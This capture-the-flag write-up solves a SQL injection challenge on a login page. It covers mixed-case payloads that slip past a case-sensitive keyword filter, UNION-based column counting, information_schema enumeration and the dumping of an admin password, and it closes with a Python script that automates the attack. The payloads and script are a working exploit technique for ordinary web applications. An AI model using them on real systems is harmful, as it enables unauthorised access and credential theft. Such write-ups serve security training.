SQL Injection Master

📅 December 2024 | 🏆 Example CTF 2024 | 💯 250 points

Challenge Description

"Our new login system is totally secure! We've implemented cutting-edge security measures. Can you prove us wrong and get the admin password?"

We're given a URL to a login page and told that we need to extract the admin password from the database.

Initial Reconnaissance

Upon visiting the challenge URL, we're presented with a simple login form containing username and password fields. Let's start by testing for SQL injection vulnerabilities.

Testing for SQL Injection

First, I tried a classic SQL injection payload in the username field: 

' OR '1'='1' --

The server responded with an error message indicating that our input was blocked. This tells us there's some form of Web Application Firewall (WAF) in place.

Bypassing the WAF

After some testing, I discovered that the WAF was blocking common SQL keywords like OR, UNION, and SELECT. However, it was case-sensitive!

I tried using mixed-case keywords to bypass the filter: 

' oR '1'='1' --

This worked! The server accepted our input and we were logged in as the first user in the database.

Extracting the Admin Password

Now that we've confirmed the SQL injection vulnerability, we need to extract the admin password. Let's use a UNION-based attack to dump the database contents.

Step 1: Find the Number of Columns

First, we need to determine how many columns the original query returns: 

' uNiOn SeLeCt NuLl --
' uNiOn SeLeCt NuLl, NuLl --
' uNiOn SeLeCt NuLl, NuLl, NuLl --

The query with 3 NULLs worked, so we have 3 columns.

Step 2: Extract Table Names

' uNiOn SeLeCt table_name, NuLl, NuLl fRoM information_schema.tables --

This revealed a table called users.

Step 3: Extract Column Names

' uNiOn SeLeCt column_name, NuLl, NuLl fRoM information_schema.columns wHeRe table_name='users' --

We found columns: id, username, password.

Step 4: Dump the Admin Password

' uNiOn SeLeCt username, password, NuLl fRoM users wHeRe username='admin' --

And we got the admin password!

Solution Script

Here's a Python script that automates the attack:

import requests

url = "http://challenge.ctf.com/login"

# Bypass WAF with mixed case
payload = "' uNiOn SeLeCt username, password, NuLl fRoM users wHeRe username='admin' --"

data = {
    "username": payload,
    "password": "anything"
}

response = requests.post(url, data=data)
print(response.text)

Lessons Learned

  • Case-insensitive WAF rules are insufficient protection
  • Always test multiple SQL injection bypass techniques
  • UNION-based attacks are powerful for data extraction
  • information_schema is your best friend for database enumeration
